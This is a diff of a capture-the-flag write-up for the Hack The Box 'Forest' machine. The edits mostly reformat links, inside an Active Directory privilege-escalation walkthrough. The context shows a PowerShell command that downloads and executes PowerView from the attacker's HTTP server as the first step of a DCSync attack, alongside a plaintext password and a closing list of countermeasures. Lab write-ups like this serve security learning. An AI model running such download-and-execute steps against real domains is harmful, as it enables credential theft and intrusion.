@@ -38,7 +38,7 @@ Sweet. Now we have svc-alfresco's password. Now what? Well, when looking for nex
 
 
 ## Privilege Escalation
-Alright, we finally have access to the box. Let's cut right to it and escalate our privileges. We know this is some sort of Directory server since it has LDAP services enabled, and the name of the box is Forest (Active Directory) lol. Because of that, let's use Sharphound and Bloodhound to extract AD objects. If you've never used them before, don't worry, they are pretty easy to use. I'll break them down further during our walkthrough video. For now, Sharphound collects the AD objects and Bloodhound analyzes it. There are other ways to collect the objects but we're going to use Sharphound (*https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors*).
+Alright, we finally have access to the box. Let's cut right to it and escalate our privileges. We know this is some sort of Directory server since it has LDAP services enabled, and the name of the box is Forest (Active Directory) lol. Because of that, let's use Sharphound and Bloodhound to extract AD objects. If you've never used them before, don't worry, they are pretty easy to use. I'll break them down further during our walkthrough video. For now, Sharphound collects the AD objects and Bloodhound analyzes it. There are other ways to collect the objects but we're going to use [Sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors).
 
 
 First, we'll need to download sharphound to our local machine and then transfer it to the target box (forest). Use the github repo above to download sharphound. Then start up a webserver on your local machine so you can retrieve the file over http from the target box.
@@ -102,7 +102,7 @@ Then we'll add it to the right group.
 
 ![image](https://user-images.githubusercontent.com/48168337/166678947-15b1789b-8a27-4ddc-85fc-563b6c804881.png)
 
-Now we run the Dsync attack steps from Bloodhound. The only thing we'll need for this to work is the PowerView.ps1 script (*https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1*). This script is the first thing that gets executed. Make sure you're hosting the script via http (python webserver) so we can execute it. Once you're http service is running use the lines below, one a time, to setup the dsync attack.
+Now we run the Dsync attack steps from Bloodhound. The only thing we'll need for this to work is the PowerView.ps1 [script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). This script is the first thing that gets executed. Make sure you're hosting the script via http (python webserver) so we can execute it. Once you're http service is running use the lines below, one a time, to setup the dsync attack.
 
 1. IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PowerView.ps1')
 2. $SecPassword = ConvertTo-SecureString 'olinesecurity' -AsPlainText -Force
@@ -128,4 +128,4 @@ A few countermeasures before we go.
 (1) Anonymous users shouldn't be able to remotely list account names and resources. We did this with enum4linux. This is how we found the service account (svc_alfresco). 
 (2) Pre-authentication should be enabled to prevent the AS-REP roasting attack. With this enabled we wouldn't be able to get svc_alfresco's TGT hash. 
 (3) Better group access controls may have prevented us from creating our own access controls to perform the Dsync attack. 
-(4) Furthermore, we want to try and prevent the Dsync attack. This can be difficult to do since its abusing normal Active Directory functionality. However, we can prevent the attack by limiting the users and groups that can replicate directory changes. All in all, what made this box exciting was it being a use-case scenario. Hopefully, you enjoyed this writeup. I will share a video walkthrough here shortly.
+(4) Furthermore, we want to try and prevent the Dsync attack. This can be difficult to do since its abusing normal Active Directory functionality. However, we can prevent the attack by limiting the users and groups that can replicate directory changes. All in all, what made this box exciting was it being a use-case scenario. Hopefully, you enjoyed this writeup, [here](https://youtu.be/DLPgQ9ooxCQ) is the video walkthrough.
